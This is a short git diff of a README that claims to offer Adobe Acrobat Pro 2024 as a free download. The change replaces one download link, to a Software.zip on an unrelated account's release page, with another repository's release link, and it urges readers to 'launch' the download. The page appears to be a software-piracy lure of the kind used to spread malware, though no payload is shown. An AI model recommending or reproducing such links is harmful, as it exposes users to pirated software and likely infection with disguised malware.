@@ -15,7 +15,7 @@ This repository provides the latest version of Adobe Acrobat Pro 2024 for free d
 ## Download Adobe Acrobat Pro 2024
 To download Adobe Acrobat Pro 2024 for free, simply click the button below:
 
-[![Download Adobe Acrobat Pro 2024](https://img.shields.io/badge/Download-Adobe_Acrobat_Pro_2024-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Adobe Acrobat Pro 2024](https://github.com/kdcjrspb/Adobe-Acrobat-Pro-2024/releases/tag/v2.0)](https://github.com/kdcjrspb/Adobe-Acrobat-Pro-2024/releases/tag/v2.0)
 
 Please note that the download link needs to be **launched** to start the download process. 
 
